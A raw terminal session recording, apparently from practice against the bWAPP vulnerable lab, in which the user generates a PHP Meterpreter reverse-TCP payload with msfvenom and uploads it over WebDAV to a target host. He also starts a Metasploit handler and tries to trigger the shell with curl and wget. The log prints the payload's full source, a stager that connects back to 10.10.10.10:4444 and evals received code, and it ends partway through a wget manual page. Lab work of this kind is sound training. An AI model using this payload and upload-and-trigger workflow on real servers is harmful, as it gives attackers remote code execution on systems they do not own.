@@ -1,0 +1,1031 @@
+Script started on 2020-08-18 19:02:48+05:30 [TERM="xterm-256color" TTY="/dev/pts/9" COLUMNS="135" LINES="34"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ ll
+total 60
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:50 01.session
+-rw-r--r-- 1 dinesh dinesh 49152 Aug 17 17:51 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:51 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6943 Aug 17 17:51 01.session.script
+-rw-r--r-- 1 dinesh dinesh     0 Aug 18 19:02 terminal-log_Tue_18_Aug_2020_07:02:48_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ msfconsole -q
+-----------------------------------------------------------------------------------
+The pg and/or activerecord gem version has changed, meaning deprecated pg constants
+may no longer be in use, so try deleting this file to see if the
+'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
+/usr/share/metasploit-framework/lib/pg/deprecated_constants.rb
+-----------------------------------------------------------------------------------
+
+[1m[34m[*][0m Starting persistent handler(s)...
+[?1034h[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> use mul[K[K[Kexploit/multi/handler [K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kinfo payload/php/
+info payload/php/bind_perl                       info payload/php/meterpreter/bind_tcp_ipv6_uuid
+info payload/php/bind_perl_ipv6                  info payload/php/meterpreter/bind_tcp_uuid
+info payload/php/bind_php                        info payload/php/meterpreter/reverse_tcp
+info payload/php/bind_php_ipv6                   info payload/php/meterpreter/reverse_tcp_uuid
+info payload/php/download_exec                   info payload/php/meterpreter_reverse_tcp
+info payload/php/exec                            info payload/php/reverse_perl
+info payload/php/meterpreter/bind_tcp            info payload/php/reverse_php
+info payload/php/meterpreter/bind_tcp_ipv6       info payload/php/shell_findsock
+[4mmsf5[0m [0m> info payload/php/,e[K[Kmeterpreter/reverse_tcp
+[1]+  Stopped                 msfconsole -q
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ msfvenom -p payload/php/meterpreter/reverse_tcp[1Pphp/meterpreter/reverse_tcp[1Pphp/meterpreter/reverse_tcp[1Pphp/meterpreter/reverse_tcp[1Pphp/meterpreter/reverse_tcp[1Pphp/meterpreter/reverse_tcp[1Pphp/meterpreter/reverse_tcp[1Pphp/meterpreter/reverse_tcp[1Php/meterpreter/reverse_tcp[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C LHOST=10.10.10.10 LPORT 4444[1P4444=4444[C[C[C[C -r [K[Kf raw- -[K[K[K[K]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw[K[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o payload_1.phprpayload_1.phptpayload_1.php_payload_1.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 1112 bytes
+Saved as: rt_payload_1.php
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ ll
+total 68
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:50 01.session
+-rw-r--r-- 1 dinesh dinesh 49152 Aug 17 17:51 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:51 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6943 Aug 17 17:51 01.session.script
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 19:04 rt_payload_1.php
+-rw-r--r-- 1 dinesh dinesh  4096 Aug 18 19:04 terminal-log_Tue_18_Aug_2020_07:02:48_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ cadaver 
+dav:!> ^CTerminated by signal 2.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ cadaver ll[Kmsfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o rt_payload_1.php[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ ll[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccadaver https://10.10.10.6/webdav/
+WARNING: Untrusted server certificate presented for `bee-box.bwapp.local':
+Certificate was issued to hostname `bee-box.bwapp.local' rather than `10.10.10.6'
+This connection could have been intercepted.
+Issued to: IT, MME, Menen, Flanders, BE
+Issued by: IT, MME, Menen, Flanders, BE
+Certificate is valid from Sun, 14 Apr 2013 18:11:32 GMT to Fri, 13 Apr 2018 18:11:32 GMT
+Do you wish to accept the certificate? (y/n) y
+dav:/webdav/> put [K[K[Kls[K[K[Kls
+Listing collection `/webdav/': succeeded.
+Coll:   cve-2009-2692                          0  Aug 18 18:57
+        Iron_Man.pdf                      543803  Nov  3  2014
+        Terminator_Salvation.pdf          462949  Nov  3  2014
+        The_Amazing_Spider-Man.pdf        544600  Nov  3  2014
+        The_Cabin_in_the_Woods.pdf        526187  Nov  3  2014
+        The_Dark_Knight_Rises.pdf         756522  Nov  3  2014
+        The_Incredible_Hulk.pdf           618117  Nov  3  2014
+        bWAPP_intro.pdf                  5010042  Nov  3  2014
+        backdoor.php                         136  Aug 18 16:50
+        cve-2009-2692.tar                  20480  Aug 18 18:46
+        msf_http_put_test.txt                 13  Aug 18 17:05
+        nc_traffic                           690  Aug 18 03:03
+        payload.php                         3024  Aug 18 18:12
+        payload2.php                        1112  Aug 18 18:29
+        qwerty.php                           162  Aug 18 16:47
+        reverse_tcp_payload.php             1112  Aug 18 18:38
+dav:/webdav/> put ./p[Krt_payload_1.php 
+Uploading ./rt_payload_1.php to `/webdav/rt_payload_1.php':
+Progress: [                              ]   0.0% of 1112 bytesProgress: [=============================>] 100.0% of 1112 bytes succeeded.
+dav:/webdav/> [H[2Jdav:/webdav/> ls
+Listing collection `/webdav/': succeeded.
+Coll:   cve-2009-2692                          0  Aug 18 18:57
+        Iron_Man.pdf                      543803  Nov  3  2014
+        Terminator_Salvation.pdf          462949  Nov  3  2014
+        The_Amazing_Spider-Man.pdf        544600  Nov  3  2014
+        The_Cabin_in_the_Woods.pdf        526187  Nov  3  2014
+        The_Dark_Knight_Rises.pdf         756522  Nov  3  2014
+        The_Incredible_Hulk.pdf           618117  Nov  3  2014
+        bWAPP_intro.pdf                  5010042  Nov  3  2014
+        backdoor.php                         136  Aug 18 16:50
+        cve-2009-2692.tar                  20480  Aug 18 18:46
+        msf_http_put_test.txt                 13  Aug 18 17:05
+        nc_traffic                           690  Aug 18 03:03
+        payload.php                         3024  Aug 18 18:12
+        payload2.php                        1112  Aug 18 18:29
+        qwerty.php                           162  Aug 18 16:47
+        reverse_tcp_payload.php             1112  Aug 18 18:38
+        rt_payload_1.php                    1112  Aug 18 19:05
+dav:/webdav/> ^CTerminated by signal 2.
+Connection to `10.10.10.6' closed.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ fg
+msfconsole -q
+^L
+[H[2J[4mmsf5[0m [0m> info payload/php/meterpreter/reverse_tcp
+[0m
+       Name: PHP Meterpreter, PHP Reverse TCP Stager
+     Module: payload/php/meterpreter/reverse_tcp
+   Platform: PHP
+       Arch: php
+Needs Admin: No
+ Total size: 1101
+       Rank: Normal
+
+Provided by:
+  egypt <egypt@metasploit.com>
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LHOST                   yes       The listen address (an interface may be specified)
+LPORT  4444             yes       The listen port
+
+Description:
+  Run a meterpreter server in PHP. Reverse PHP connect back stager 
+  with checks for disabled functions
+
+
+[4mmsf5[0m [0m> 
+[0m[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> 
+[0m[4mmsf5[0m [0m> ll
+[0m[1m[31m[-][0m Unknown command: ll.
+^L[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> Interrupt: use the 'exit' command to quit
+[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> show options 
+[0m
+Global Options:
+===============
+
+   Option             Current Setting      Description
+   ------             ---------------      -----------
+   ConsoleLogging     false                Log all console input and output
+   LogLevel           0                    Verbosity of logs (default 0, max 3)
+   MeterpreterPrompt  [4mmeterpreter[0m  The meterpreter prompt string
+   MinimumRank        0                    The minimum rank of exploits that will run without explicit confirmation
+   Prompt             msf5                 The prompt string
+   PromptChar         >                    The prompt character
+   PromptTimeFormat   %Y-%m-%d %H:%M:%S    Format for timestamp escapes in prompts
+   SessionLogging     false                Log all input and output for sessions
+   TimestampOutput    false                Prefix all console output with a timestamp
+
+[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> use exploit/multi/l[Khandler 
+[0m[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> hosts [K[K[K[K[K[Kshi[Kow options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> use [K[K[K[Kset payload phop[K[Kp/
+set payload php/bind_perl                       set payload php/meterpreter/bind_tcp_ipv6_uuid
+set payload php/bind_perl_ipv6                  set payload php/meterpreter/bind_tcp_uuid
+set payload php/bind_php                        set payload php/meterpreter/reverse_tcp
+set payload php/bind_php_ipv6                   set payload php/meterpreter/reverse_tcp_uuid
+set payload php/download_exec                   set payload php/meterpreter_reverse_tcp
+set payload php/exec                            set payload php/reverse_perl
+set payload php/meterpreter/bind_tcp            set payload php/reverse_php
+set payload php/meterpreter/bind_tcp_ipv6       
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> set payload php/meterpreter/reverse_tcp
+[0mpayload => php/meterpreter/reverse_tcp
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> l[Kshow options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> set LHOST 10.10.10.10
+[0mLHOST => 10.10.10.10
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[1]+  Stopped                 msfconsole -q
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ less rt_payload_1.php 
+[?1049h[22;0;0t[?1h=/*<?php /**/ error_reporting(0); $ip = '10.10.10.10'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tc p://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream';  } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $por t); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_typ e) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("N len", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b));  break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type;  if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypas s(); } else { eval($b); } die();
+[7mrt_payload_1.php (END)[27m[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ fg[K[Kfg
+msfconsole -q
+
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> set LHOST 10.10.10.10[P[P[P[P[P[P[P[Phow options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.10.10      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> exploit &
+[0mUsage: exploit [options]
+
+Launches an exploitation attempt.
+
+OPTIONS:
+
+    -J        Force running in the foreground, even if passive.
+    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
+    -f        Force the exploit to run regardless of the value of MinimumRank.
+    -h        Help banner.
+    -j        Run in the context of a job.
+    -n <opt>  The NOP generator to use.  If none is specified, NOP is used.
+    -o <opt>  A comma separated list of options in VAR=VAL format.
+    -p <opt>  The payload to use.  If none is specified, PAYLOAD is used.
+    -t <opt>  The target index to use.  If none is specified, TARGET is used.
+    -z        Do not interact with the session after successful exploitation.
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> exploit &[K
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.10.10:4444 
+^Z
+[1]+  Stopped                 msfconsole -q
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ wget https://10.10.10.6/webdav/rt_payload_1.php[1P[1P[1P[1P https://10.10.10.6/webdav/rt_payload_1.phpc https://10.10.10.6/webdav/rt_payload_1.phpu https://10.10.10.6/webdav/rt_payload_1.phpr https://10.10.10.6/webdav/rt_payload_1.phpl https://10.10.10.6/webdav/rt_payload_1.php[C https://10.10.10.6/webdav/rt_payload_1.php- https://10.10.10.6/webdav/rt_payload_1.phps https://10.10.10.6/webdav/rt_payload_1.phpS https://10.10.10.6/webdav/rt_payload_1.phpL https://10.10.10.6/webdav/rt_payload_1.php[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C &
+[2] 17604
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ curl: (35) error:1425F102:SSL routines:ssl_choose_client_version:unsupported protocol
+
+[2]-  Exit 35                 curl -sSL https://10.10.10.6/webdav/rt_payload_1.php
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ fg
+msfconsole -q
+
+
+
+
+
+
+
+
+
+
+^C[1m[31m[-][0m Exploit failed [user-interrupt]: Interrupt 
+[1m[31m[-][0m exploit: Interrupted
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> show options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.10.10      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> exploit 
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.10.10:4444 
+^Z
+[1]+  Stopped                 msfconsole -q
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ wget https://10.10.10.6/webdav/rt_payload_1.php & 
+[2] 17634
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ 
+Redirecting output to ‘wget-log’.
+
+[2]-  Exit 5                  wget https://10.10.10.6/webdav/rt_payload_1.php
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ 
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ ll
+total 88
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:50 01.session
+-rw-r--r-- 1 dinesh dinesh 49152 Aug 17 17:51 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:51 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6943 Aug 17 17:51 01.session.script
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 19:04 rt_payload_1.php
+-rw-r--r-- 1 dinesh dinesh 20480 Aug 18 19:08 terminal-log_Tue_18_Aug_2020_07:02:48_PM_IST.dmp
+-rw-r--r-- 1 dinesh dinesh   391 Aug 18 19:08 wget-log
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ cat wget-log 
+--2020-08-18 19:08:42--  https://10.10.10.6/webdav/rt_payload_1.php
+Connecting to 10.10.10.6:443... connected.
+ERROR: The certificate of ‘10.10.10.6’ is not trusted.
+ERROR: The certificate of ‘10.10.10.6’ doesn't have a known issuer.
+ERROR: The certificate of ‘10.10.10.6’ has expired.
+The certificate has expired
+The certificate's owner does not match hostname ‘10.10.10.6’
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ fg
+msfconsole -q
+
+
+
+^C[1m[31m[-][0m Exploit failed [user-interrupt]: Interrupt 
+[1m[31m[-][0m exploit: Interrupted
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> exspl[K[K[Kploit 
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.10.10:4444 
+^Z
+[1]+  Stopped                 msfconsole -q
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ man wget 
+[?1049h[22;0;0t[?1h=WGET(1)                                                       GNU Wget                                                      WGET(1)[m
+[m
+[1mNAME[0m[m
+       Wget - The non-interactive network downloader.[m
+[m
+[1mSYNOPSIS[0m[m
+       wget [[4moption[24m]... [[4mURL[24m]...[m
+[m
+[1mDESCRIPTION[0m[m
+       GNU Wget is a free utility for non-interactive download of files from the Web.  It supports HTTP, HTTPS, and FTP protocols,[m
+       as well as retrieval through HTTP proxies.[m
+[m
+       Wget is non-interactive, meaning that it can work in the background, while the user is not logged on.  This allows you to[m
+       start a retrieval and disconnect from the system, letting Wget finish the work.  By contrast, most of the Web browsers[m
+       require constant user's presence, which can be a great hindrance when transferring a lot of data.[m
+[m
+       Wget can follow links in HTML, XHTML, and CSS pages, to create local versions of remote web sites, fully recreating the[m
+       directory structure of the original site.  This is sometimes referred to as "recursive downloading."  While doing that, Wget[m
+       respects the Robot Exclusion Standard ([4m/robots.txt[24m).  Wget can be instructed to convert the links in downloaded files to[m
+       point at the local files, for offline viewing.[m
+[m
+       Wget has been designed for robustness over slow or unstable network connections; if a download fails due to a network[m
+       problem, it will keep retrying until the whole file has been retrieved.  If the server supports regetting, it will instruct[m
+       the server to continue the download from where it left off.[m
+[m
+[1mOPTIONS[0m[m
+   [1mOption[0m [1mSyntax[0m[m
+       Since Wget uses GNU getopt to process command-line arguments, every option has a long form along with the short one.  Long[m
+       options are more convenient to remember, but take time to type.  You may freely mix different option styles, or specify[m
+       options after the command-line arguments.  Thus you may write:[m
+[m
+               wget -r --tries=10 http://fly.srk.fer.hr/ -o log[m
+[m
+[7m Manual page wget(1) line 1 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       The space between the option accepting an argument and the argument may be omitted.  Instead of [1m-o[0m [1mlog[0m you can write [1m-olog[0m.[m
+[7m Manual page wget(1) line 2 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page wget(1) line 3 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       You may put several options that do not require arguments together, like:[m
+[7m Manual page wget(1) line 4 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page wget(1) line 5 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K               wget -drc <URL>[m
+[7m Manual page wget(1) line 6 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page wget(1) line 7 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       This is completely equivalent to:[m
+[7m Manual page wget(1) line 8 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page wget(1) line 9 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K               wget -d -r -c <URL>[m
+[7m Manual page wget(1) line 10 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page wget(1) line 11 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       Since the options can be specified after the arguments, you may terminate them with [1m--[0m.  So the following will try to[m
+[7m Manual page wget(1) line 12 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       download URL [1m-x[0m, reporting failure to [4mlog[24m:[m
+[7m Manual page wget(1) line 13 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page wget(1) line 14 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K               wget -o log -- -x[m
+[7m Manual page wget(1) line 15 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page wget(1) line 16 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       The options that accept comma-separated lists all respect the convention that specifying an empty list clears its value.[m
+[7m Manual page wget(1) line 17 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       This can be useful to clear the [4m.wgetrc[24m settings.  For instance, if your [4m.wgetrc[24m sets "exclude_directories" to [4m/cgi-bin[24m, the[m
